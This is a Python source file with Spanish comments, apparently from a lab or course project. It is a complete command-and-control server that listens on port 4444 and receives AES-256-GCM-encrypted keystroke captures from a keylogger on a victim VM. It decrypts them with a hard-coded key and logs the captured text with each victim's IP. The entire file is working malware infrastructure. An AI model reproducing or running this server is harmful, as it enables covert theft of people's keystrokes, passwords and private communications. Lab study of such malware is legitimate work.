"""
server.py
=========
Servidor C2 (Command & Control) — Máquina atacante (Parrot Linux)

Descripción
-----------
Escucha conexiones TCP entrantes del keylogger en la VM víctima Ubuntu 24.04.
Por cada conexión entrante:
  1. Lee el header (4 bytes big-endian) para conocer la longitud del payload.
  2. Recibe exactamente `length` bytes de payload cifrado.
  3. Guarda el payload cifrado en raw_encrypted.bin (evidencia de cifrado en tránsito).
  4. Descifra con AES-256-GCM.
  5. Almacena el texto en claro en logs/received.log con timestamp e IP de origen.
  6. Envía un ACK de 4 bytes al keylogger.

Uso (en la VM Parrot, máquina atacante)
-----------------------------------------
    pip install cryptography
    python3 server.py

Los logs descifrados se guardan en ./logs/received.log
Los payloads cifrados (evidencia MITM) en ./logs/raw_encrypted.bin
"""

import os
import struct
import logging
import datetime
import socketserver

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ──────────────────────────────────────────────────────────────────────────────
# CLAVE AES-256 (debe ser idéntica a la del keylogger.py en la víctima)
# ──────────────────────────────────────────────────────────────────────────────

AES_KEY: bytes = bytes([
    0x3A, 0xF1, 0x7C, 0x9E, 0x42, 0xBD, 0x05, 0x6F,
    0xC8, 0x21, 0xEA, 0x3D, 0x90, 0x54, 0x18, 0xAB,
    0x77, 0xCC, 0xFE, 0x0B, 0x2E, 0x61, 0xD4, 0x83,
    0x5B, 0x96, 0x1A, 0xE7, 0x0F, 0x48, 0xD9, 0x22,
])


def decrypt_payload(ciphertext: bytes, key: bytes) -> bytes:
    """
    Descifra un payload AES-256-GCM.

    Formato del payload (producido por keylogger.py):
        [12 bytes nonce] [N bytes ciphertext+tag GCM]

    Parámetros
    ----------
    ciphertext : bytes  Payload cifrado recibido del keylogger.
    key        : bytes  Clave AES-256 de 32 bytes (compartida con el keylogger).

    Retorno
    -------
    bytes  Texto en claro descifrado y autenticado.

    Excepciones
    -----------
    InvalidTag  Si el tag GCM no coincide (posible manipulación MITM).
    """
    nonce      = ciphertext[:12]
    cipherdata = ciphertext[12:]
    aesgcm     = AESGCM(key)
    return aesgcm.decrypt(nonce, cipherdata, None)

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN
# ──────────────────────────────────────────────────────────────────────────────

LISTEN_HOST: str = "0.0.0.0"    # escuchar en todas las interfaces de Parrot
LISTEN_PORT: int = 4444

LOG_DIR:  str = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
LOG_FILE: str = os.path.join(LOG_DIR, "received.log")
RAW_FILE: str = os.path.join(LOG_DIR, "raw_encrypted.bin")

ACK_BYTES: bytes = b"\x00\xAC\x00\x4B"

# ──────────────────────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────────────────────

os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("c2-server")


# ──────────────────────────────────────────────────────────────────────────────
# HANDLER DE CONEXIONES
# ──────────────────────────────────────────────────────────────────────────────

class KeyloggerHandler(socketserver.BaseRequestHandler):
    """
    Manejador de cada conexión TCP entrante del keylogger.

    Método principal: handle()
    --------------------------
    1. Lee 4 bytes de header (longitud del payload, big-endian unsigned int).
    2. Lee exactamente `length` bytes de payload cifrado usando _recv_exact().
    3. Guarda el payload cifrado en raw_encrypted.bin (evidencia para demo MITM).
    4. Descifra con AES-256-GCM. Si el tag GCM falla -> mensaje manipulado.
    5. Escribe el plaintext en received.log con timestamp e IP origen.
    6. Envía ACK de 4 bytes al keylogger.
    """

    def handle(self) -> None:
        """
        Procesa una conexión entrante del keylogger.

        self.request      : socket de la conexión
        self.client_address: (ip, port) del keylogger
        """
        client_ip, client_port = self.client_address
        log.info("Conexion entrante desde %s:%d", client_ip, client_port)

        try:
            # 1. Header: 4 bytes big-endian = longitud del payload cifrado
            raw_header = self._recv_exact(4)
            if not raw_header or len(raw_header) < 4:
                log.warning("Conexion cerrada sin datos desde %s.", client_ip)
                return

            (length,) = struct.unpack(">I", raw_header)
            log.debug("Payload esperado: %d bytes.", length)

            if length == 0 or length > 10_000_000:   # sanity check: max 10 MB
                log.error("Longitud de payload inválida: %d. Descartando.", length)
                return

            # 2. Payload cifrado
            encrypted = self._recv_exact(length)
            if len(encrypted) < length:
                log.error("Payload incompleto: %d/%d bytes.", len(encrypted), length)
                return

            # 3. Guardar payload cifrado (evidencia para demo MITM con Wireshark)
            self._save_raw(encrypted, client_ip)

            # 4. Descifrar con AES-256-GCM
            try:
                plaintext = decrypt_payload(encrypted, AES_KEY)
                decoded   = plaintext.decode("utf-8", errors="replace")
            except Exception as exc:
                # Fallo de tag GCM: el mensaje fue modificado en tránsito (MITM)
                log.error(
                    "FALLO DE AUTENTICACION GCM desde %s. "
                    "Posible manipulacion MITM: %s", client_ip, exc
                )
                return

            # 5. Guardar plaintext en log
            self._save_log(decoded, client_ip)
            log.info(
                "Chunk descifrado correctamente: %d chars desde %s.",
                len(decoded), client_ip
            )

            # 6. Enviar ACK
            self.request.sendall(ACK_BYTES)

        except OSError as exc:
            log.error("Error de socket con %s: %s", client_ip, exc)

    def _recv_exact(self, n: int) -> bytes:
        """
        Recibe exactamente `n` bytes del socket, manejando la fragmentación TCP.

        TCP es un protocolo de flujo continuo: un solo send() del emisor puede
        llegar en múltiples recv() en el receptor. Esta función garantiza que
        siempre se lean exactamente `n` bytes antes de continuar.

        Parámetros
        ----------
        n : int
            Número exacto de bytes a recibir.

        Retorno
        -------
        bytes
            Los `n` bytes recibidos (o menos si el socket se cierra antes).
        """
        data = b""
        while len(data) < n:
            chunk = self.request.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        return data

    def _save_raw(self, encrypted: bytes, src_ip: str) -> None:
        """
        Persiste el payload cifrado en raw_encrypted.bin para evidenciar
        que los datos viajan cifrados (útil en la demostración del ataque MITM).

        Formato del registro
        --------------------
        [8 bytes timestamp UTC big-endian]
        [1 byte  longitud IP]
        [N bytes IP de origen]
        [4 bytes longitud payload big-endian]
        [M bytes payload cifrado]

        Parámetros
        ----------
        encrypted : bytes  Payload cifrado.
        src_ip    : str    IP de origen del keylogger.
        """
        ts       = int(datetime.datetime.utcnow().timestamp()).to_bytes(8, "big")
        ip_bytes = src_ip.encode()
        with open(RAW_FILE, "ab") as f:
            f.write(ts)
            f.write(len(ip_bytes).to_bytes(1, "big"))
            f.write(ip_bytes)
            f.write(struct.pack(">I", len(encrypted)))
            f.write(encrypted)

    def _save_log(self, text: str, src_ip: str) -> None:
        """
        Añade el texto descifrado a received.log con timestamp e IP de origen.

        Parámetros
        ----------
        text   : str   Texto descifrado (teclas capturadas).
        src_ip : str   IP del keylogger (VM víctima Ubuntu).
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        separator = "─" * 60
        entry = (
            f"\n{separator}\n"
            f"[{timestamp}] FROM {src_ip}\n"
            f"{separator}\n"
            f"{text}\n"
        )
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry)


# ──────────────────────────────────────────────────────────────────────────────
# PUNTO DE ENTRADA
# ──────────────────────────────────────────────────────────────────────────────

def main() -> None:
    """
    Arranca el servidor TCP multihilo y escucha indefinidamente en Parrot.

    Usa ThreadingTCPServer para manejar múltiples clientes (víctimas)
    de forma concurrente en hilos separados.
    """
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer(
        (LISTEN_HOST, LISTEN_PORT), KeyloggerHandler
    ) as server:
        log.info("C2 Server escuchando en %s:%d", LISTEN_HOST, LISTEN_PORT)
        log.info("Log descifrado : %s", LOG_FILE)
        log.info("Payloads crudos: %s", RAW_FILE)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            log.info("Servidor detenido.")


if __name__ == "__main__":
    main()
